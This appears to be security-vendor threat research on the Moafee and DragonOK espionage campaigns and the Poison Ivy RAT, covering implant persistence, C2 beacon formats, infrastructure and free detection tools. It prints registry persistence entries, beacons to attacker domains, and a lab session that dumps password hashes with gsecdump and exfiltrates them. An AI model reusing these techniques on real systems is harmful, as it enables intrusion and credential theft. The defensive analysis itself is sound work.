The implant also creates a registry entry file called named `` Windows.reg '' and imports it the contents of this file into the registry , using the command : `` regedit.exe /s Windows.reg '' .
These registry entries ensure startup persistence .
The contents of `` Windows.reg '' is populated based on the Operating System ( OS ) which is determined by a call to the GetVersionEx API .
If `` dwBuildNumber '' is equal to 2 ( VER _ PLATFORM_WIN32_NT ) and `` dwMajorVersion '' is less than 6 ( prior to Windows Vista ) it adds following entry for persistence : [ HKEY_CLASSES_ROOT\CLSID\ { fbeb8a05- beee-4442 - 804e-409d6c4515e9 } \ InProcServer32 ] @ = '' % Temp % \MSSoap . DLL '' Otherwise it creates a copy of itself to % Temp % \ WmiPrvSer.exe and creates the following entry for persistence : HKCU \Software\Microsoft\Windows\ CurrentVersion\Run\ '' dllhost '' = % Temp % \WmiPrvSer.exe We also found some clues in the binary that indicate that the tool was authored and built by someone using Chinese fonts on their computer .
It contains resource strings in English but the language is set to Chinese as shown below .
The implant ( example : ccff6e0a6f5e7715bdaf62adf0cbed4f ) is called `` NewCT / CT '' RAT .
The particular version we analyzed was NewCT version 2 .
The implant has persistence mechanisms and contains functionality to perform command and control communication .
This backdoor also has functionality to load additional plugins from the command and control server .
It exports the following two functions : SendData CreateInstance It creates a mutex `` HFRM _ '' to ensure there is only one running copy of the backdoor .
It ensures this by checking if the return value from CreateMutexA is 183 ( \xB7 ) , which corresponds to `` ERROR_ALREADY_EXISTS '' .
The payload emits the `` POST '' network beacon shown below along with stub data .
The header values are hardcoded in the payload , specifically the values for `` User - Agent '' , `` Cache - Control '' and the bytes at offset 0 of the stub ( \xcf\xcf ) may be of interest to network defenders .
The POST stub contains encrypted data .
The encrypted data has two layers of abstraction .
It is subjected to a bitwise NOT operation followed by encryption using a randomly generated 4-byte XOR key .
The data within the POST stub is constructed in a buffer with a header at offset 0 ( \ x30\x30 ) followed by the remote sever , remote port , XOR encrypted data and function call location .
The function call location is represented by the textual values shown in the table below and is selected using a switch case statement as shown in Figure 12 .
It is used by the attacker to track the call path that resulted in the network beacon .
The XOR encrypted data contains the MAC Address , hostname and campaign code .
To elucidate the encryption scheme , let us go over a sample decryption process .
The Figures 13 and 14 below shows data before and after a bitwise NOT operation .
In the resulting data after NOT operation , the XOR key is \x30\x30\x34\x31 .
When applied to the hex data following it , we get the decrypted data below , which contains the MAC Address , hostname , and campaign code .
The Python routine to perform this decryption is included in Appendix A We observed plugin functionality in the implant .
It has the ability to load a DLL downloaded from the remote server , and calls the following export functions in the DLL : Plugin_GetID Plugin_Init Plugins_Start Plugin_End The call graph for this functionality is shown in Figure 16 .
NewCT RAT evolved from older versions called '' CT '' , which has been observed being used in association with the `` Nflog '' Backdoor .
The following password - protected document ( 46ac122183c32858581e95ef40bd31b3 ) creates a DLL implant called IntelAMTPP.dll ( ebd1f5e471774bb283de44e121efa3e5 ) , which is the `` CT '' RAT .
In this case , the `` CT '' implant is 10 MB in size , as it has padded null bytes at the end of the file to increase file size in a possible attempt to evade AV engines as described in the previous section on evasion techniques .
The `` CT '' implant has identical functionality to `` NewCT '' , as observed from the embedded strings .
00005A58 Connection : close 00005A6C Cache - Control : max- age=259200 00005A8C Pragma : no - cache 00005AA0 Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) 00005AD4 Content - Type : application/ octet - stream 00005AFC image / gif , image / x - xbitmap , image / jpeg , image/ pjpeg , / 00005B38 Accept - Language : en - en 00005B50 % s % 02x 00005B5C home.asp 00005B68 index.css 00005B74 index.jsp 00005B80 index.php 00005B8C index.asp 00005EFC ct.datangcun.com 00005F3C ct.datangcun.com 00005F7C 20120509 00005F8C CT V2.1 00006374 Plugin_End 00006380 Plugin_Start 00006390 Plugin_Init 0000639C Plugin_GetID This version was called `` CT V2.1 '' by the author , which may indicate that there were other earlier versions of this RAT and that it was improved upon incrementally .
One of the command and control servers used by a variant of this implant is aptly named `` ct.datangcun [ .
] com '' .
We do not believe either Moafee or DragonOK have controlled the domain `` ct.datangcun [ .
] com '' , but it was probably controlled by a third group which also used the implant in a separate campaign .
The network beacon for version 2.1 is shown below ; it uses the same encryption scheme as `` NewCT '' : POST / HTTP/1.1 Accept - Language : en - en Content - Type : application / oc- tet - stream Pragma : no - cache Cache - Control : max - age=259200 Content - Length : 1572 User - Agent : Mozilla/4.0 ( compati- ble ; MSIE 6.0 ; Windows NT 5.1 ) Host : ct.datangcun [ .
] com:1353\x0d\ x0a\x0d\x0a\xcf\xcf We also observed both attack groups using campaign codes within this implant and which are listed in Appendix B .
The campaign codes re- ferred to victim countries , attack dates , command and control infrastructure , and other operational codes – which remain undeciphered .
We have observed DragonOK and Moafee use the Nflog implant in addition to an earlier version of the NewCT2 implant .
The pass- word - protected XLS document ( 46ac- 122183c32858581e95ef40bd31b3 ) ref- erenced earlier also drops an `` Nflog '' implant ( a3d3b0686e7bd13293ad0e63ebec67af ) in addition to … .. The `` Nflog '' implant emits the following network beacon format : POST /NfLog / Nfile.asp HTTP/1.1 Accept : * / * User - Agent : Mozilla/5.0 ( compati- ble ; MSIE 7.0 ; Windows NT 5.1 ) Host : Content - Length : 0 Cache - Control : no - cache POST /NfLog / NfStart.asp ? Clien- tId= { LocalIP } % 20 < 49d0 > % 20 { Ex- ternalIP } & Nick= { Identifier } & d- time = T:8 - 6 - 0 - 53 HTTP/1.1 Accept : * / * Use - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.0 ; .NET
CLR 1.1.4322 ) Host : Content - Length : 36 Cache - Control : no - cache Cookie : ASPSESSIONIDACCARCDD = OKNPG- CKDLEKEHBOHIHLCOMHD We have observed the use of a newer variant of Nflog ( example : 3eab5e12f99b47e822721e- 93639ba1d1 ) being employed in attacks , which has the beacon format shown below : POST /windowsxp / SNews.asp ? HostID= { - MAC Address } HTTP/1.1 Accept : / Cache - Control : no - cache User - Agent : Mozilla/4.0 ( compati- ble ; MSIE 6.0 ; Windows NT 5.0 ; .NET
CLR 1.1.4322 ) Host : Content - Length : 126 Connection : Close Cookie : ASPSESSIONIDAARSSTTB = ECD- DKIAAOHGODEKKFGOKNJCD Other URI formats it uses are as follows : /windowsxp / SSports.asp ? HostID= /windowsxp / SWeather.asp ? HostID= /windowsxp / SJobs.asp ? HostID= /windowsxp / STravel.asp ? HostID= /windowsxp / NfHostInfo.asp ? NickId= /windowsxp / SGames.asp ? HostID= Note the same User - Agent `` Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.0 ; .NET
CLR 1.1.4322 ) '' is used by both the older and newer version of `` Nflog '' samples .
We also found code - level similarities in the network communication function code , as well as the data collection function code shown in Figure 17 .
This strongly suggests that it is an updated version of the `` Nflog '' backdoor .
This tool has recently been analyzed by Secure- works .
We observed the DragonOK attacker employ this tool against targets in Japan and Taiwan ( e.g .
57e3d002542e07f2eb09fd2b1b0ee- ab2 ) , as also noted by Secureworks .
We have not yet seen the Moafee group use this tool .
This implant has the following beacon format : GET /el / sregister.php ? name= [ REDACTED ] HTTP/1.1 User - Agent : Mozilla/5.0 ( compatible ; MSIE 10.0 ; Windows NT 6.1 ; Trident/6.0 ) Host : 122.10.62.137 Connection : Keep - Alive Other URI formats include : /el / slogin.php ? uid= /el / suploadfile.php ? item= /el / suploadfile.php FireEye has previously analyzed this backdoor , which is used by multiple other groups in addition to DragonOK and Moafee .
DragonOK in partic- ular is known to frequently use this implant ( e.g .
e8d77d19e1c6f462f4a5bf6fbe673a3c ) , which has the following network beacon format : GET /3000FC080000 [ REDACTED 00000000 0000000000000000000000000000000000 0000000000000000000000000000000000 0000000000000000000000000000000000 00100000 [ REDACTED ] 0000000000000000 000000000000000000000000000000000 0 0000000000000000 [ REDACTED ] 000000 HTTP/1.1 User - Agent : Mozilla/4.0 ( compatible ; MSIE 7.0 ; Windows NT 6.1 ; WOW64 ; Trident/6.0 ; SLCC2 ; .NET
CLR 2.0.50727 ; .NET
CLR 3.5.30729 ; .NET
CLR 3.0.30729 ; Media Center PC 6.0 ) Host : mail.jpaols [ .
] com:443 Cache - Control : no - cache This is a publicly available RAT used by multiple threat actors , which has been extensively analyzed in a previous FireEye white paper .
The ex- tracted configuration blocks from a `` DragonOK '' PoisonIvy variant ( 65fcc9b9ff608801edc- 697552438cfee ) , is shown below : ID : ftp Domains : ftp.skydnastwm.com:15836| Password : Ecp982 * @ Me2 Mutex : fftp In contrast , here is an extracted PoisonIvy configuration block from a `` Moafee '' instance ( 9ebe86a648b1f19836251f946a160b16 ) , as shown below : ID : Domains : afp.mozjlla.com| Password : 741526 Mutex : ) ! afpA.I4 We have observed the Moafee group target the governments and militaries of countries with national interests in the South China Sea .
We have also observed this group target companies within the US defense industrial base .
As discussed , we have observed the Moafee group use a number of different tools including Poison Ivy , Nflog , Mongall , and NewCT2 .
We found this group running HTRAN on one of their front - end command and control servers .
The command and control server in question was located at 58.64.201.229 .
We monitored this server for two months , from January to March this year .
During this time period , we observed the following domains resolving to 58.64.201.229 : ph.moafee [ .
] com afp.mozjlla [ .
] com mofa.mozjlla [ .
] com acer.moafee [ .
] com del.moafee [ .
] com jnt.moafee [ .
] com pcg.moafee [ .
] com sslc.moafee [ .
] com at.moafee [ .
] com lw.moafee [ .
] com ks.moafee [ .
] com oa.moafee [ .
] com xxpp.moafee [ .
] com hp.moafee [ .
] com gumm.mozjlla [ .
] com msn.moafee [ .
] com During this same time frame , the HTRAN client at 58.64.201.229 was observed attempting to connect to a number of different backend HTRAN servers .
All of these HTRAN servers were located in the Guangdong Province and operated by CHINANET .
Additionally , the Moafee group also hosted a PoisonIvy command and control server at phi .
crabdance [ .
] com .
Between April 30 , 2012 and July 1 , 2012 , the phi.crabance [ .
] com domain resolved to 98.126.91.66 .
This IP was observed hosting a HTRAN proxy client , which was seen connecting to a backend HTRAN server hosted at 113.66.248.60 .
This server was also located in the Guangdong Province and operated by CHINANET .
In short , the Moafee group was observed consistently hosting their backend HTRAN servers in Guangdong .
This observation may reveal that the Moafee group is physically located in this province .
We have observed the DragonOK group target high - technology and manufacturing companies in both Japan and Taiwan .
This group has used similar malware to the Moafee group described above .
Specifically , we observed DragonOK employing PoisonIvy , Nflog , Mongall , CT , and NewCT .
Like the Moafee group , we observed the DragonOK group running an HTRAN proxy client on one of their front - end command and control servers .
For approximately one week , between July 31 , 2013 and August 8 , 2013 , the domain www.ndbssh [ .
] com served as a command and control server for Mongall payloads distributed by the DragonOK group .
During this time , DragonOK also ran an HTRAN proxy client on www.ndbssh [ .
] com .
This HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated by CHINANET .
The domain www.ndbssh [ .
] com resolved to 206.161.216.219 between 2013 - 09 - 28 and 2013 - 10 - 04 .
The following other domains were seen resolving to this same IP : The DragonOK group was observed hosting their backend HTRAN servers in Jiangsu .
This observation may reveal that the DragonOK group is physically located in the Jiangsu province .
Based on the geolocation evidence provided in this paper , it appears that different operators executed the Moafee and DragonOK campaigns .
This conclusion is supported by the following assessments : • The campaigns target different industries in different geographic locations .
The Moafee campaign targets government and military organizations in countries with national interests in the South China Sea .
In contrast , the DragonOK campaign has been observed targeting high - technology and manufacturing companies in Japan and Taiwan .
• The campaigns maintain separate back - end command and control infrastructures hosted in different provinces in Mainland China .
The Moafee campaign can be traced to infrastructure located in the Guangdong province , whereas the DragonOK campaign can be traced to infrastructure located in the Jiangsu province .
While it seems that different operators are responsible for these two campaigns , our research showed that these operators share a number of common tools , techniques and procedures ( TTPs ) .
We also believe a separate third group is using these TTPs but we do not have sufficient insight to this operator at this time .
The shared TTPs include : • Usage of the same custom backdoors and RATs such as CT / NewCT / NewCT2 , Mongall , Nflog , as well as off - the - shelf RATs such as PoisonIvy , to maintain access to the victims ' networks .
• Usage of HTRAN to proxy their command and control communication .
• Usage of the same evasion techniques to evade detection such as environment checks based on CPU cores , password protected documents , and the use of large null padded files .
We assess that these shared TTPs may be the result of : • A direct relationship between the operators .
• An indirect relationship such as the completion of a common training regimen .
• A common quartermaster or supply - chain for their malware tools .
We would like to thank Ronghwa Chong , Nart Villeneuve , Darien Kindlund , Kenneth Gears and Jonathan Wrolstad for their insight , research and support .
FireEye has invented a purpose - built , virtual machine - based security platform that provides real - time threat protection to enterprises and governments worldwide against the next generation of cyber attacks .
These highly sophisticated cyber attacks easily circumvent traditional signature - based defenses , such as next - generation firewalls , IPS , anti - virus , and gateways .
The FireEye Threat Prevention Platform provides real - time , dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors and across the different stages of an attack life cycle .
The core of the FireEye platform is a virtual execution engine , complemented by dynamic threat intelligence , to identify and block cyber attacks in real time .
FireEye has over 1,900 customers across more than 60 countries , including over 130 of the Fortune 500 .
Remote access tools ( RATs ) may be the hacker 's equivalent of training wheels , as they are often regarded in IT security circles .
But dismissing this common breed of malware could be a costly mistake .
Despite their reputation as a software toy for novice `` script kiddies , '' RATs remain a linchpin of many sophisticated cyber attacks .
Requiring little technical savvy to use , RATs offer unfettered access to compromised machines .
They are deceptively simple - attackers can point and click their way through the target 's network to steal data and intellectual property .
But they are often delivered as key component of coordinated attacks that use previously unknown ( zero - day ) software flaws and clever social engineering .
Even as security professionals shrug off the threat , the presence of a RAT may in itself indicate a targeted attack known as an advanced persistent threat ( APT ) .
Unlike malware focused on opportunistic cybercrime ( typically conducted by botnets of comprised machines ) , RATs require a live person on the other side of the attack .
This report spotlights Poison Ivy ( PIVY ) , a RAT that remains popular and effective a full eight years after its release , despite its age and familiarity in IT security circles .
In conjunction with the study , FireEye® is releasing Calamine , a set of free tools to help organizations detect and examine Poison Ivy infections on their systems .
Poison Ivy has been used in several high - profile malware campaigns , most notoriously , the 2011 compromise of RSA SecurID data .
The same year , Poison Ivy powered a coordinated attack dubbed Nitro against chemical makers , government agencies , defense firms and human - rights groups .
Several ongoing cyber attack campaigns use Poison Ivy , including these : • admin @ 338-Active since 2008 , this campaign mostly targets the financial services industry , though we have also seen activity in the telecom , government , and defense sectors .
• th3bug - First detected in 2009 , this campaign targets a number of industries , primarily higher education and healthcare .
• menuPass - Also launched in 2009 , this campaign appears to originate from China , targeting U.S. and overseas defense contractors .
Understanding why Poison Ivy remains one of the most widely used RATs is easy .
Controlled through a familiar Windows interface , it offers a bevy of handy features : key logging , screen capturing , video capturing , file transfers , password theft , system administration , traffic relaying , and more .
And Poison Ivy is so widely used that security professionals have a harder time tracing attacks that use the RAT to any particular attacker .
We hope to eliminate some of that anonymity with the FireEye Calamine package .
The package , which enables organizations to easily monitor Poison Ivy 's behavior and communications , includes these components : • PIVY callback - decoding tool ( ChopShop module ) • IVY memory - decoding tool ( Immunity Debugger PyCommand script ) ChopShop is a new framework developed by the MITRE Corporation for network - based protocol decoders that enable security professionals to understand actual commands issued by human operators controlling endpoints .
The FireEye PIVY module for ChopShop decrypts Poison Ivy network traffic .
PyCommands , meanwhile , are Python scripts that automate tasks for Immunity Debugger , a popular tool for reverse - engineering malware binaries .
The FireEye PyCommand script dumps configuration information from a running PIVY process on an infected endpoint , which can provide additional telemetry about the threat actor behind the attack .
FireEye is sharing the Calamine tools with the security community at large under the BSD 2-Clause License for both commercial and non - commercial use worldwide .
The tools are available for download at the following locations : • https : //github.com / fireeye / pycommands • https : //github.com / fireeye / chopshop By tracking the PIVY server activity , security professionals can find these telltale indicators : • The domains and IPs used for Command and Control ( CnC ) • The attacker 's PIVY process mutex • The attacker 's PIVY password • The launcher code used in the malware droppers • A timeline of malware activity This report explains how Calamine can connect these and other facets of the attack .
This evidence is especially useful when it is correlated with multiple attacks that display the same identifying features .
Combining these nuts - and - bolts details with big - picture intelligence can help profile threat attackers and enhance IT defenses .
Calamine may not stop determined attackers that use Poison Ivy .
But it can make their criminal endeavors that much more difficult .
Poison Ivy is a remote access tool that is freely available for download from its official web site at www.poisonivy-rat.com .
First released in 2005 , the tool has gone unchanged since 2008 with v ersion 2.3.2 .
Poison Ivy includes features common to most Windows - based RATs , including key logging , screen capturing , video capturing , file transfers , system administration , password theft , and traffic relaying .
Poison Ivy 's wide availability and easy - to - use features make it a popular choice for all kinds of criminals .
But it is probably most notable for its role in many high profile , targeted APT attacks .
These APTs pursue specific targets , using RATs to maintain a persistent presence within the target 's network .
They move laterally and escalate system privileges to extract sensitive information- whenever the attacker wants to do so . , Because some RATs used in targeted attacks are widely available , determining whether an attack is part of a broader APT campaign can be difficult .
Equally challenging is identifying malicious traffic to determine the attacker 's post - compromise activities and assess overall damage - these RATs often encrypt their network communications after the initial exploit .
In 2011 , three years after the most recent release of PIVY , attackers used the RAT to compromise security firm RSA and steal data about its SecureID authentication system .
That data was subsequently used in other attacks .
The RSA attack was linked to Chinese threat actors and described at the time as extremely sophisticated .
Exploiting a zero - day vulnerability , the attack delivered PIVY as the payload . , It was not an isolated incident .
The campaign appears to have s tarted in 2010 , with many other companies compromised .
PIVY also played a key role in the 2011 campaign known as Nitro that targeted chemical makers , government agencies , defense contractors , and human rights groups . , Still active a year later , the Nitro attackers used a zero - day vulnerability in Java to deploy PIVY in 2012 .
Just recently , PIVY was the payload of a zero - day exploit in Internet Explorer used in what is known as a '' strategic web compromise '' attack against visitors to a U.S. government website and a variety of others .
RATs require live , direct , real - time human interaction by the APT attacker .
This characteristic is distinctly different from crimeware ( malware focused on cybercrime ) , where the criminal can issue commands to their botnet of compromised endpoints whenever they please and set them to work on a common goal such as a spam relay .
In contrast , RATs are much more personal and may indicate that you are dealing with a dedicated threat actor that is interested in your organization specifically .
The Poison Ivy builder kit allows attackers to customize and build their own PIVY server , which is delivered as mobile code to a target that has been compromised , typically using social engineering .
Once the server executes on a target 's endpoint , it connects to a PIVY client installed on the attacker 's machine , giving the attacker control of the target system .
The PIVY server code can executed on the target endpoint in a number of ways , depending on how the attacker configured it .
In the most common configuration , the PIVY server divides its code into two parts : • Initialization and maintenance code • Networking code The initialization and maintenance code is injected into the already - running explorer.exe process .
Depending on how the attacker configures it , the networking code launches a hidden Web browser process ( the system 's default browser ) and injects itself into that process .
The networking code then remotely downloads ( from the attacker 's PIVY client as shellcode ) the rest of the code and data it needs for its features and functionality .
The new code executes on the target 's endpoint within the context of the target process .
All of PIVY 's global variables , configuration details , and function pointers are stored in a C - style struct ( data structure ) , which is also injected into the target processes in both the PIVY networking code and initialization and maintenance code .
This distinct characteristic has the side effect of having every CALL instruction and global variable address being referenced as an offset to a register when looking at the code 's disassembly .
The code injected into explorer.exe is peculiar in that , unlike most malware - injected code , this code is injected function by function- each with its own memory region , filling in the proper function pointers in its struct .
If the '' persistence '' PIVY option is enabled , a watchdog thread is also injected into explorer.exe , which automatically restarts the PIVY server process if it is unexpectedly terminated by the target 's operating system .
PIVY 's keylogging function , if enabled , is also injected into explorer.exe .
Figure 2 : Data and functions referenced as offsets to the struct pointed to by the ESI register Poison Ivy features a complex , custom network protocol over TCP .
Most of this communication is encrypted using the Camellia cipher with a 256-bit key.14 The key is derived from a password provided by the attacker when building the PIVY server .
The password , `` admin '' by default , can be provided in plain text or as hex - ASCII .
The password is zero - padded to 32 bytes ( 256 bits ) .
The key is validated at the beginning of the TCP session with a challenge - response algorithm .
The PIVY server sends 256 bytes of randomly generated data to the PIVY client which , in turn , encrypts the data using the key and sends it back to the PIVY server for validation .
Much of the data sent throughout PIVY 's communications is also compressed before encryption using Microsoft 's LZNT1 compression algorithm,15 which PIVY utilizes through the Windows RtlCompressBuffer API .
The protocol operates by sending encrypted data in chunks that are prepended with the following encrypted 32-byte header : struct PI_chunk_header { int command_id ; int stream_id ; int padded_chunk_size ; int chunk_size ; int decompressed_chunk_size ; long total_stream_size ; int padding ; } ; The PI_chunk_header structure is arranged as follows : command_id - This member identifies which feature of PIVY the chunked data is related to .
stream_id - This member identifies which stream this flow corresponds to .
PIVY 's protocol supports sending multiple streams of data simultaneously .
padded_chunk_size - Because Camellia is a 16-byte block cipher , padding is utilized in the headers and in the data chunks .
chunk_size - Chunks are assembled into a stream of data that could be anything , such as a transferred file , shellcode to execute , a screen capture bitmap file , or raw data .
decompressed_chunk_size - If this size is different from the chunk_size , the chunk is compressed using LZNT1 .
total_stream_size - This member specifies the total size of the data being sent for the related command_id .
padding - This member specifies the zero padding ( up to 32 bytes ) .
The FireEye Poison Ivy decoder checks the beginning of each TCP session for possible PIVY challengeresponse sequences .
If found , the module will try to validate the response using one or more passwords supplied as arguments .
If no password is supplied , it tries the default `` admin '' password .
You can supply a single password in either plain - text form or hex - ASCII form .
For multiple passwords , you can specify a text file containing line - delimited passwords .
If the decoder identifies valid initial PIVY flows based on a supplied password , then the decoder decodes the rest of the relevant flow or flows .
To use the FireEye ChopShop module , you must install CamCrypt , a python wrapper for an open - source implementation of the Camellia encryption library .
Most of the features of PIVY are covered to some extent in this module .
Note : If the PIVY flows do not correspond to any supplied password , then decoding fails .
Fortunately , you can easily locate the custom PIVY password if you have a compromised endpoint infected with PIVY or a copy of the PIVY server code , as explained in the section `` Locating the PIVY Password with the Calamine PyCommand Script .
'' Calamine ChopShop offers the following features and options : • Files transferred to or from the PIVY server are saved to disk when the -f option is used .
• Webcam , audio , keylog , and single screen captures are saved to disk when the -c option is used .
• The audio captures are saved as raw data that can easily be converted to .wav
files u sing a tool such as SoX .
The decoder prints the sample rate , channel , and bit data .
• File and registry search details and results are displayed .
• The details of any network relays instantiated are displayed .
• Active port listings are displayed .
This module partially supports decoding listings of Windows files , the registry , services , processes , devices , and installed application listings .
During PIVY flow decoding , the module 's default output indicates that listing requests have occurred and , when applicable , highlights which key or directory is being listed .
Directory listings are printed , but without file details .
When the module is invoked with the -1 option , all returned list data is saved to a file in raw for m , just as it is seen by the PIVY client : a mixtur e of strings and binary data describing those strings .
If you are interested in the details of what was listed , running the strings tool on raw file dumps is useful .
If you encounter an unrecognized command or want to extend the functionality of this decoder , the -d option is useful .
It prints hex dumps of all the headers and assembled streams in both directions , helping to analyze and build additional parsing functionality .
Many attackers leave the default `` admin '' password unchanged .
In this case , you can start using this decoder immediately .
Often , however , the attacker opts for better security by creating a unique password .
But if you have access to the PIVY - infected endpoint or to the PIVY server executable , retrieving the password is easy .
You can retrieve the password a number of ways , depending on your circumstance and preferences .
If you prefer working with memory dumps , digital forensics expert Andreas Schuster has released a wonderful Volatility plugin for PIVY.18 Volatility dumps most of PIVY 's useful configuration data , including the password , as shown at the Volatility project page ( http : //code.google.com / p / volatility/ source / browse / trunk / contrib / plugins / malware/ poisonivy.py ? r=2833 ) .
If you have a malware - analysis environment setup , the Calamine PyCommand19 script for Immunity Debugger is quick and simple .
The Volatility plugin is available at https : //www.volatilesystems .
com / default / volatility .
Corelan Team .
`` Starting to write Immunity Debugger PyCommands : my cheatsheet .
'' January 2010 .
Follow these steps to use the PyCommand ( these steps may vary in some situations ) : 1 .
Attach Immunity Debugger to the process PIVY injects into ( or to the PIVY process itself if PIVY does not inject ) .
2 .
Set breakpoints on the send and connect functions .
3 .
Continue execution .
4 .
Wait for the execution to break .
5 .
Execute until return and step out of the function .
6 .
Run the PyCommand .
7 .
Check the logs for the configuration details .
To effectively assess the damage sustained in an attack , you must reconstruct the attacker 's activities .
Depending upon the attacker 's cleanup efforts , fully reconstructing their activities from host forensics alone may not be possible .
But if PIVY network activity is collected , the Calamine ChopShop module can help uncover this information .
In the following example , we set up a test environment and executed commands typically run by attackers after they compromise a system with PIVY and prepare to move laterally .
Then Defender 's View Starting ChopShop Initializing Modules ...
Initializing module ' poisonivy_23x ' Transferred files will be saved .. Screen / Cam / Audio / Key captures will be saved .. Running Modules ...
[ 2013 - 07 - 03 06:46:29 PDT ] Poison Ivy Version:2.32 [ 2013 - 07 - 03 06:46:30 PDT ] * * * Host Information * * * PI profile ID : mal IP address : 192.168.0.12 Hostname : BLUE Windows User : admin Windows Version : Windows XP Windows Build : 2600 Service Pack : Service Pack 3 Attacker 's View [ 2013 - 07 - 03 06:46:36 PDT ] * * * Shell Session * * * Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985 - 2001 Microsoft Corp. C : \ > [ 2013 - 07 - 03 06:46:42 PDT ] * * * Shell Session * * * ipconfig [ 2013 - 07 - 03 06:46:43 PDT ] * * * Shell Session * * * Windows IP Configuration Connection - specific DNS Suffix .
: IP Address .
.
.
.
.
.
.
.
.
.
.
.
: 192.168.0.15 Subnet Mask .
.
.
.
.
.
.
.
.
.
.
: 255.255.255.0 Default Gateway .
.
.
.
.
.
.
.
.
: 192.168.0.1 C : \ > Attacker 's View Defender 's View [ 2013 - 07 - 03 06:47:23 PDT ] inbound file C : \gsecdump.exe [ 2013 - 07 - 03 06:47:46 PDT ] saved PI- extractedinbound- file-1-gsecdump.exe .. Attacker 's View [ 2013 - 07 - 03 06:47:46 PDT ] * * * Shell Session * * * gsecdump.exe -a > hash.txt 0043B820 info : you must run as LocalSystem to dump LSA secrets [ 2013 - 07 - 03 06:47:46 PDT ] * * * Shell Session * * * C : \ > Attacker 's View [ 2013 - 07 - 03 06:47:54 PDT ] * * * Directory Listing Sent * * * AUTOEXEC.BAT boot.ini CONFIG.SYS gsecdump.exe hash.txt IO.SYS MSDOS.SYS NTDETECT.COM ntldr pagefile.sys [ 2013 - 07 - 03 06:48:02 PDT ] outbound file C : \hash.txt [ 2013 - 07 - 03 06:48:02 PDT ] saved PI - extractedoutbound- file-2-hash.txt .. Attacker 's View Defender 's View [ 2013 - 07 - 03 06:48:57 PDT ] * * * Screen Capture Sent * * * PI - extracted - file-3-screenshot.bmp saved .. [ 2013 - 07 - 03 06:49:03 PDT ] * * * Remote Desktop Session * * * [ 2013 - 07 - 03 06:49:03 PDT ] * * * Remote Desktop Session * * * Shutting Down Modules ...
Shutting Down poisonivy_23x Module Shutdown Complete ...
ChopShop Complete Attacker 's View using our Calamine ChopShop module , we reconstructed what operations occurred .
After the initial compromise , the `` attackers '' see that they have a new target endpoint and do the following : • Execute some basic commands such as ipconfig to collect the network information of the endpoint • Upload the password - dumping tool gsecdump ( available at http : //www.truesec .
se / sakerhet / verktyg / saakerhet / gsecdump _ v2.0b5 ) • Dump the password hashes on the endpoint to a file • Download a file containing the password hashes off the endpoint ( to crack the target 's passwords offline ) • Take a screenshot of the target 's desktop APT activity is best described as a campaign - a series of attacks over time .
Each individual attack within a campaign can be divided into the following phases : , , • Reconnaissance • Exploitation • CnC • Lateral movement • Exfiltration ( or other malicious actions on the target ) Each of these phases provides opportunities to derive threat intelligence about the adversary .
Over time , security professionals can acquire and analyze evidence to determine whether the attacks constitute malware - based espionage .
Such an assessment requires understanding these components of an attack : • Timing and targeting preferences • Exploits and malware • Network infrastructure • Scope of attackers ' activities within a compromised network ( including stolen data ) • Characteristics of the target population This assessment demands more than just malware analysis .
It requires analyzing both the technical and contextual aspects of a breach and exploring competing hypotheses . , These steps are important because investigators will always face visibility gaps - limitations in knowing the geographic and industry reach of attacks or details of malware activity in some phases of the attack .
For this analysis , we collected 194 Poison Ivy samples used in targeted attacks between 2008 and 2013 .
We extracted 22 different passwords and 148 mutexes .
We also mapped out the CnC infrastructure , which comprised 147 domains and 165 IP addresses .
We analyzed these samples to better understand the tools , tactics , and procedures ( TTPs ) of the attackers , explore campaign connections among them , and enable defenders to better secure their networks .
In addition to clustering the samples based on technical indicators , such as the passwords and CnC information extracted from the samples , we also analyzed contextual indicators where possible , such as attackers ' targeting preferences and lures used in social engineering .
Each PIVY server ( the malware that the attacker sends to the target ) can be configured to connect to multiple CnC servers using any TCP port .
So seeing a PIVY sample that attempts to connect to multiple CnC servers on different TCP ports is not unusual .
But the most common ports used in targeted attacks are those associated with Web traffic - especially 443 , the TCP port used for SSL - encrypted Web traffic .
Port 443 is a significant choice for two reasons .
First , perimeter defenses must allow outbound traffic through this port so that users can access legitimate SSL - encrypted websites .
Second , because the traffic on port 443 is encrypted , PIVY 's encrypted traffic may bl end in with normal network activity .
( Many protocol - aware perimeter defenses , however , can detect and flag PIVY traffic ) .
The attacker can set the PIVY process mutex name at build time .
While some attacks use the default mutex of ) ! VoqA.I4 , most create a custom mutex for each attack .
Of the 147 mutexes in our sample set , 56 were designed for one - time use .
If attackers create a unique password at build time rather than using the PIVY default `` admin '' , that custom password is the most unique indicator .
While threat actors may change passwords used over time , we have found that they often use the same one for significant periods .
When combined with CnC data , the passwords used by the actors provide unique indicators that can be used to cluster related activity .
To cluster the activity of specific APT campaigns across our PIVY sample set , we first grouped the PIVY samples by common CnC infrastructure .
Using passive DNS , we clustered the domain names used by the common IP address to which they resolved .
Because attackers may park their domains by pointing to IP addresses that they do not necessarily control ( and to account for other possible anomalies in passive DNS data ) , we layered additional indicators extracted from the samples , such as PIVY passwords , mutexes , campaign `` marks / codes , '' and launcher information .
From our data set , we focused on three separate APT campaigns and corresponding threat actors identified by the PIVY password used in subsequent attacks : • admin @ 338 • th3bug • menuPass Each of these campaigns is detailed in the corresponding sections .
To triangulate the timing ( when the sample was likely used ) , we used the portable executable ( PE ) compile time extracted from the PIVY samples and the date each sample appeared first appeared in a malwareanalysis services such as VirusTotal .
Each of these APT campaigns has been active from 2008 through 2013 .
Our data set for the admin @ 338 threat actor contains the following : • 21 Poison Ivy samples • 3 passwords • 43 CnC servers The earliest admin @ 338 PIVY sample we have dates to December 27 , 2009 .
But we believe that this campaign was active as early as January 7 , 2008 , using other PIVY passwords ( key @ 123 and gwx @ 123 ) .
This ongoing campaign tends to target the finance , economic , and trade policy but we see significant activity in the ISP / telco , government , and defense sectors as well .
The preferred attack vector used by this campaign is spear - phishing emails .
Using content that is relevant to the target , these emails are designed to entice the target to open an attachment that contains the malicious PIVY server code .
The content of the spear - phishing emails and the decoy documents opened after exploitation tend to be in English - although the character set of the email message body in Figure 10 is actually Chinese ( character set GB2312 ) .
This campaign has used weaponized Microsoft Word documents ( CVE-2012 - 0158 ) , Adobe Acrobat PDFs ( CVE-2009 - 4324 ) and Microsoft Help Files ( .HLP
